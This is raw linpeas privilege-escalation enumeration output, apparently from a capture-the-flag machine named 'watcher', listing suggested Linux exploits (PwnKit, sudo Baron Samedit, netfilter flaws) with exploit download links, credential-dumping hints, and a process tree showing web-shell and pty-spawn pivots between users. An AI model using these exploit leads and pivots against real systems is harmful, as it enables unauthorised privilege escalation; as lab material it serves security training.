cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security//5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security//5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.

╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ AppArmor profile? .............. unconfined
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present
/usr/bin/lxc
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. Yes
═╣ AWS Lambda? .......................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-093694236b624e8ad
instance-action: none
instance-id: i-0a6b1f107393cbf35
instance-life-cycle: on-demand
instance-type: t2.nano
region: eu-west-1

══╣ Account Info
{
  "Code" : "Success",
  "LastUpdated" : "2023-03-15T21:37:53Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:60:de:a6:7c:75/
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:

══╣ IAM Role

══╣ User Data

                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root         1  0.0  1.8 225344  8980 ?        Ss   21:19   0:03 /sbin/init auto automatic-ubiquity noprompt
root       414  0.0  3.5 127788 17636 ?        S<s  21:19   0:01 /lib/systemd/systemd-journald
root       431  0.0  0.3 105904  1872 ?        Ss   21:19   0:00 /sbin/lvmetad -f
root       442  0.0  1.1  46780  5508 ?        Ss   21:19   0:00 /lib/systemd/systemd-udevd
systemd+   590  0.0  0.6 141956  3184 ?        Ssl  21:20   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+   711  0.0  0.9  80080  4880 ?        Ss   21:20   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   728  0.0  0.9  70660  4864 ?        Ss   21:20   0:00 /lib/systemd/systemd-resolved
root       813  0.1  0.5 637024  2880 ?        Ssl  21:20   0:05 /usr/bin/lxcfs /var/lib/lxcfs/
root       820  0.0  1.3 286244  6600 ?        Ssl  21:20   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       823  0.0  2.7 169100 13724 ?        Ssl  21:20   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       824  0.0  5.2 728300 25812 ?        Ssl  21:20   0:00 /usr/bin/amazon-ssm-agent
message+   833  0.0  0.8  50060  4216 ?        Ss   21:20   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root       839  0.0  1.1  62156  5708 ?        Ss   21:20   0:00 /lib/systemd/systemd-logind
root       840  0.0  0.6  30028  2952 ?        Ss   21:20   0:00 /usr/sbin/cron -f
root      2174  0.0  0.6  57500  3224 ?        S    21:41   0:00  _ /usr/sbin/CRON -f
mat       2175  0.0  0.1   4628   760 ?        Ss   21:41   0:00      _ /bin/sh -c /home/toby/jobs/cow.sh
mat       2176  0.0  0.6  11592  3192 ?        S    21:41   0:00          _ /bin/bash /home/toby/jobs/cow.sh
mat       2178  0.0  1.0  21232  4960 ?        S    21:41   0:00              _ /bin/bash -i
root      2359  0.0  0.8  62220  4064 ?        S    22:07   0:00                  _ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
will      2360  0.0  1.9  28540  9424 ?        S    22:07   0:00                      _ /usr/bin/python3 /home/mat/scripts/will_script.py 1
will      2361  0.0  0.1   4628   900 ?        S    22:07   0:00                          _ sh -c /bin/bash
will      2362  0.0  0.2  11592  1212 ?        S    22:07   0:00                              _ /bin/bash
will      2363  0.0  0.6  11592  3184 ?        S    22:07   0:00                                  _ /bin/bash
will      2370  0.0  0.6  11592  3072 ?        S    22:08   0:00                                      _ bash
will      2371  0.0  1.9  39084  9720 ?        S    22:08   0:00                                          _ python3 -c import pty;pty.spawn("/bin/bash")
will      2372  0.0  1.0  21216  4976 pts/2    Ss   22:08   0:00                                              _ /bin/bash
will      2486  0.1  0.5   5360  2508 pts/2    S+   22:12   0:00                                                  _ /bin/sh ./linpeas.sh
will      5978  0.0  0.1   5360   888 pts/2    S+   22:20   0:00                                                      _ /bin/sh ./linpeas.sh
will      5982  0.0  0.7  38524  3640 pts/2    R+   22:20   0:00                                                      |   _ ps fauxwww
will      5981  0.0  0.1   5360   888 pts/2    S+   22:20   0:00                                                      _ /bin/sh ./linpeas.sh
daemon[0m     845  0.0  0.4  28332  2180 ?        Ss   21:20   0:00 /usr/sbin/atd -f
syslog     850  0.0  0.8 263036  4100 ?        Ssl  21:20   0:00 /usr/sbin/rsyslogd -n
root       882  0.0  0.4  29148  2064 ?        Ss   21:20   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       897  0.0  1.3 291456  6648 ?        Ssl  21:20   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       900  0.0  3.1 185948 15500 ?        Ssl  21:20   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       913  0.0  0.4  14664  2132 ttyS0    Ss+  21:20   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root       915  0.0  0.3  14888  1624 tty1     Ss+  21:20   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root       930  0.0  1.0  72304  5240 ?        Ss   21:20   0:00 /usr/sbin/sshd -D
root       976  0.0  2.3 329256 11700 ?        Ss   21:20   0:00 /usr/sbin/apache2 -k start
www-data   983  0.0  2.4 334116 12080 ?        S    21:20   0:00  _ /usr/sbin/apache2 -k start
www-data   987 67.3  2.7 334116 13292 ?        R    21:20  40:25  _ /usr/sbin/apache2 -k start
www-data  2053  0.0  0.1   4628   860 ?        S    21:36   0:00  |   _ sh -c sh
www-data  2054  0.0  0.1   4628   824 ?        S    21:36   0:00  |       _ sh
www-data  2059  0.0  1.8  37296  9192 ?        S    21:37   0:00  |           _ python3 -c import pty;pty.spawn("/bin/bash")
www-data  2061  0.0  0.6  18508  3412 pts/1    Ss   21:37   0:00  |               _ /bin/bash
root      2082  0.0  0.7  60576  3712 pts/1    S    21:38   0:00  |                   _ sudo -u toby /bin/bash
toby      2083  0.0  0.9  19540  4444 pts/1    S+   21:38   0:00  |                       _ /bin/bash
www-data   988  0.0  1.7 333920  8516 ?        S    21:20   0:00  _ /usr/sbin/apache2 -k start
www-data   989  0.0  2.5 334124 12304 ?        S    21:20   0:00  _ /usr/sbin/apache2 -k start
www-data   990  0.0  1.6 333712  8104 ?        S    21:20   0:00  _ /usr/sbin/apache2 -k start
www-data  2036  0.0  2.6 334116 13140 ?        S    21:35   0:00  _ /usr/sbin/apache2 -k start
root      1121  0.0  4.5 713184 22392 ?        Ssl  21:20   0:00 /usr/lib/lxd/lxd --group lxd --logfile=/var/log/lxd/lxd.log
lxd       1292  0.0  0.0  51584   384 ?        S    21:20   0:00 dnsmasq --strict-order --bind-interfaces --pid-file=/var/lib/lxd/networks/lxdbr0/dnsmasq.pid --except-interface=lo --interface=lxdbr0 --quiet-dhcp --quiet-dhcp6 --quiet-ra --listen-address=10.14.179.1 --dhcp-no-override --dhcp-authoritative --dhcp-leasefile=/var/lib/lxd/networks/lxdbr0/dnsmasq.leases --dhcp-hostsfile=/var/lib/lxd/networks/lxdbr0/dnsmasq.hosts --dhcp-range 10.14.179.2,10.14.179.254,1h --listen-address=fd42:ee66:e342:a611::1 --enable-ra --dhcp-range ::,constructor:lxdbr0,ra-stateless,ra-names -s lxd -S /lxd/ --conf-file=/var/lib/lxd/networks/lxdbr0/dnsmasq.raw -u lxd
  └─(Caps) 0x0000000000003000=cap_net_admin,cap_net_raw
root      1360  0.0  0.0   1572    48 ?        Ss   21:20   0:00  _ /sbin/init
root      1688  0.0  0.0   1572    44 ?        Ss   21:20   0:00      _ udhcpc -b -R -p /var/run/udhcpc.eth0.pid -i eth0
root      1718  0.0  0.0   1588    60 ?        Ss   21:20   0:00      _ /sbin/syslogd -t

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND    PID  TID             USER   FD      TYPE DEVICE SIZE/OFF    NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd process found (dump creds from memory as root)
apache2 process found (dump creds from memory as root)
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     761 Dec  3  2020 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Dec  3  2020 .
drwxr-xr-x 95 root root 4096 Dec 12  2020 ..
-rw-r--r--  1 root root  589 Jan 14  2020 mdadm
-rw-r--r--  1 root root  712 Jan 17  2018 php
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  191 Aug  6  2020 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x  2 root root 4096 Dec 12  2020 .
drwxr-xr-x 95 root root 4096 Dec 12  2020 ..
-rwxr-xr-x  1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x  1 root root  376 Nov 11  2019 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Jan 14  2020 mdadm
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Aug  6  2020 .
drwxr-xr-x 95 root root 4096 Dec 12  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Aug  6  2020 .
drwxr-xr-x 95 root root 4096 Dec 12  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Aug  6  2020 .
drwxr-xr-x 95 root root 4096 Dec 12  2020 ..
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  211 Nov 12  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/1 * * * * mat /home/toby/jobs/cow.sh

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT          LAST                         PASSED      UNIT                         ACTIVATES
Wed  UTC  17min left    Wed  UTC  12min ago   phpsessionclean.timer        phpsessionclean.service
Thu  UTC  4h 28min left Wed  UTC  1h 1min ago motd-news.timer              motd-news.service
Thu  UTC  7h left       Wed  UTC  1h 1min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Thu  UTC  8h left       Wed  UTC  1h 1min ago apt-daily.timer              apt-daily.service
Thu  UTC  23h left      Wed  UTC  46min ago   systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon  UTC  4 days left   Wed  UTC  1h 1min ago fstrim.timer                 fstrim.service
n/a                          n/a           n/a                          n/a         snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a           n/a                          n/a         ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/run/acpid.socket
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/var/lib/lxd/containers/ignite/command
/var/lib/lxd/devlxd/sock
  └─(Read Write)
/var/lib/lxd/unix.socket
/var/run/dbus/system_bus_socket
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                 711 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
:1.1                                 728 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
:1.2                                   1 systemd         root             :1.2          init.scope                -          -                  
:1.25                               9186 busctl          will             :1.25         cron.service              -          -                  
:1.3                                 839 systemd-logind  root             :1.3          systemd-logind.service    -          -                  
:1.4                                 820 accounts-daemon[0m root             :1.4          accounts-daemon.service   -          -                  
:1.5                                 897 polkitd         root             :1.5          polkit.service            -          -                  
:1.7                                 823 networkd-dispat root             :1.7          networkd-dispatcher.se…ce -          -                  
:1.9                                 900 unattended-upgr root             :1.9          unattended-upgrades.se…ce -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
io.netplan.Netplan                     - -               -                (activatable) -                         -         
org.freedesktop.Accounts             820 accounts-daemon[0m root             :1.4          accounts-daemon.service   -          -                  
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
org.freedesktop.PolicyKit1           897 polkitd         root             :1.5          polkit.service            -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               839 systemd-logind  root             :1.3          systemd-logind.service    -          -                  
org.freedesktop.network1             711 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
org.freedesktop.resolve1             728 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
org.freedesktop.systemd1               1 systemd         root             :1.2          init.scope                -          -                  
org.freedesktop.thermald               - -               -                (activatable) -                         -         
org.freedesktop.timedate1              - -               -                (activatable) -                         -         

                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
watcher
127.0.0.1 localhost
127.0.1.1 watcher

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal

╔══════════╣ Interfaces
```
```bash
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.46.15  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::60:deff:fea6:7c75  prefixlen 64  scopeid 0x20<link>
        ether 02:60:de:a6:7c:75  txqueuelen 1000  (Ethernet)
        RX packets 1810  bytes 955510 (955.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1438  bytes 393737 (393.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 167  bytes 14734 (14.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 167  bytes 14734 (14.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lxdbr0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.14.179.1  netmask 255.255.255.0  broadcast 0.0.0.0
        inet6 fe80::10d9:7bff:fea4:d7a6  prefixlen 64  scopeid 0x20<link>
        inet6 fd42:ee66:e342:a611::1  prefixlen 64  scopeid 0x0<global>
        ether fe:25:db:5a:44:da  txqueuelen 1000  (Ethernet)
        RX packets 22  bytes 2612 (2.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 44  bytes 6153 (6.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethV01BP3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::fc25:dbff:fe5a:44da  prefixlen 64  scopeid 0x20<link>
        ether fe:25:db:5a:44:da  txqueuelen 1000  (Ethernet)
        RX packets 22  bytes 2920 (2.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 53  bytes 6567 (6.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 10.14.179.1:53          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 fd42:ee66:e342:a611::53 :::*                    LISTEN      -                   
tcp6       0      0 fe80::10d9:7bff:fea4:53 :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sniffing
You can sniff with tcpdump!

                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
mat:x:1002:1002:,#,,:/home/mat:/bin/bash
root:x:0:0:root:/root:/bin/bash
toby:x:1003:1003:,,,:/home/toby:/bin/bash
will:x:1000:1000:will:/home/will:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
uid=1001(ftpuser) gid=1001(ftpuser) groups=1001(ftpuser)
uid=1002(mat) gid=1002(mat) groups=1002(mat)
uid=1003(toby) gid=1003(toby) groups=1003(toby)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(ftp) gid=114(ftp) groups=114(ftp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 22:22:30 up  1:02,  0 users,  load average: 3.94, 3.18, 2.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
reboot   system boot  Thu Dec  3 02:15:17 2020 - Thu Dec  3 02:28:07 2020  (00:12)     0.0.0.0
reboot   system boot  Thu Dec  3 02:13:28 2020 - Thu Dec  3 02:28:07 2020  (00:14)     0.0.0.0
will     tty1         Thu Dec  3 02:12:09 2020 - down                      (00:01)     0.0.0.0
reboot   system boot  Thu Dec  3 02:10:54 2020 - Thu Dec  3 02:13:20 2020  (00:02)     0.0.0.0
will     pts/0        Thu Dec  3 01:38:38 2020 - Thu Dec  3 02:10:09 2020  (00:31)     192.168.153.128
will     tty1         Thu Dec  3 01:36:11 2020 - down                      (00:33)     0.0.0.0
reboot   system boot  Thu Dec  3 01:35:15 2020 - Thu Dec  3 02:10:09 2020  (00:34)     0.0.0.0
reboot   system boot  Thu Dec  3 01:34:30 2020 - Thu Dec  3 01:35:01 2020  (00:00)     0.0.0.0

